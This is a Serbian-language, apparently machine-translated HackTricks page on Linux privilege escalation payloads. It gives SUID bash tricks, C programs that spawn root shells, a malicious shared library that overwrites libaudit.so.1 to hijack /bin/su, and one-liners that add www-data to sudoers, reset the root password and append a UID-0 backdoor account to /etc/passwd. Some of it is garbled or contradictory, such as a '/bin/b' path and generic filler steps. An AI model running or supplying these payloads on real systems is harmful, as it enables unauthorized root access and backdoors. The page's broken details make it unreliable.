# Payloads to execute

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Bash

```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```

## Izvršavanje payloada

Kada je u pitanju izvršavanje payloada, postoje različite tehnike koje možete koristiti za postizanje privilegija. Ovde su neke od njih:

### 1. SUID/SGID programi

SUID (Set User ID) i SGID (Set Group ID) programi su programi koji se izvršavaju sa privilegijama vlasnika ili grupe. Možete iskoristiti ove programe kako biste izvršili payload sa privilegijama vlasnika ili grupe.

### 2. Cron poslovi

Cron poslovi su automatizovani zadaci koji se izvršavaju u određeno vreme ili periodično. Ako imate pristup cron poslovima, možete kreirati novi cron posao koji će izvršiti vaš payload.

### 3. Kernel eksploatacija

Ako pronađete ranjivost u kernelu, možete je iskoristiti kako biste dobili privilegije i izvršili payload.

### 4. Postavljanje backdoor naloga

Ako imate pristup sistemu, možete postaviti backdoor nalog sa privilegijama i izvršiti payload koristeći taj nalog.

### 5. Postavljanje reverse shell-a

Reverse shell vam omogućava da se povežete na ciljni sistem i izvršite payload sa udaljenog računara.

### 6. Exploiting Sudo

Ako imate pristup sudo privilegijama, možete iskoristiti ranjivosti u konfiguraciji sudo-a kako biste izvršili payload sa privilegijama.

### 7. Exploiting weak file permissions

Ako pronađete datoteke sa slabim dozvolama, možete ih iskoristiti kako biste izvršili payload sa privilegijama vlasnika datoteke.

### 8. Exploiting weak service configurations

Ako pronađete slabu konfiguraciju servisa, možete je iskoristiti kako biste izvršili payload sa privilegijama tog servisa.

### 9. Exploiting software vulnerabilities

Ako pronađete ranjivost u softveru koji se izvršava na ciljnom sistemu, možete je iskoristiti kako biste dobili privilegije i izvršili payload.

### 10. Exploiting misconfigurations

Ako pronađete greške u konfiguraciji sistema, možete ih iskoristiti kako biste dobili privilegije i izvršili payload.

```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```

## Prepisivanje fajla radi eskalacije privilegija

### Uobičajeni fajlovi

* Dodaj korisnika sa lozinkom u _/etc/passwd_
* Promeni lozinku unutar _/etc/shadow_
* Dodaj korisnika u sudoers u _/etc/sudoers_
* Zloupotrebi docker preko docker socket-a, obično u _/run/docker.sock_ ili _/var/run/docker.sock_

### Prepisivanje biblioteke

Proveri biblioteku koju koristi neki binarni fajl, u ovom slučaju `/bin/su`:

```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```

U ovom slučaju pokušajmo se predstaviti kao `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Dakle, provjerite funkcije ove biblioteke koje koristi **`su`** binarna datoteka:

```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```

Simboli `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` verovatno potiču iz biblioteke libaudit.so.1. Pošto će libaudit.so.1 biti prebrisana zlonamernom deljenom bibliotekom, ovi simboli treba da budu prisutni u novoj deljenoj biblioteci, inače program neće moći da pronađe simbol i završiće izvršavanje.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```

Sada, samo pozivajući **`/bin/su`** dobićete root shell.

## Skripte

Možete li naterati root da izvrši nešto?

### **www-data u sudoers**

```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### **Promena lozinke za root korisnika**

```bash
sudo passwd root
```

Ova komanda omogućava promenu lozinke za root korisnika. Nakon izvršavanja komande, bićete upitani da unesete novu lozinku za root korisnika.

```bash
echo "root:hacked" | chpasswd
```

### Dodavanje novog root korisnika u /etc/passwd

Da biste dodali novog root korisnika u datoteku /etc/passwd, pratite sledeće korake:

1. Otvorite terminal i prijavite se kao root korisnik.
2.  Pokrenite sledeću komandu da biste otvorili /etc/passwd datoteku u uređivaču teksta:

    ```bash
    nano /etc/passwd
    ```
3.  U datoteci /etc/passwd, pronađite red koji sadrži informacije o root korisniku. Obično se nalazi na početku datoteke i izgleda slično ovome:

    ```plaintext
    root:x:0:0:root:/root:/bin/bash
    ```
4. Kopirajte ovaj red i nalepite ga ispod originalnog reda.
5. Promenite korisničko ime novog korisnika u željeni naziv.
6. Sačuvajte izmene i zatvorite uređivač teksta.

Nakon ovih koraka, novi root korisnik će biti dodat u /etc/passwd datoteku.

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
